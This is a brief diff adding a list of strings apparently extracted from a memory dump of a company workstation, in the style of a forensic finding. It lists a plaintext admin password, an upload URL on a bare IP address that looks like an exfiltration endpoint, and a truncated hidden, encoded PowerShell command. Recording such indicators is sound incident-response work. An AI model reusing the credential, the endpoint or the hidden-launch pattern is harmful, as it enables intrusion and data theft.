@@ -1,0 +1,7 @@
+Extracted Strings from Memory Dump
+Target: PC-72 (Fakir Fashion & IT Limited)
+
+Filtered Results:
+password=FakirAdmin2026!
+http://103.45.67.89/upload_data
+cmd.exe /c powershell -w hidden -enc JABz...
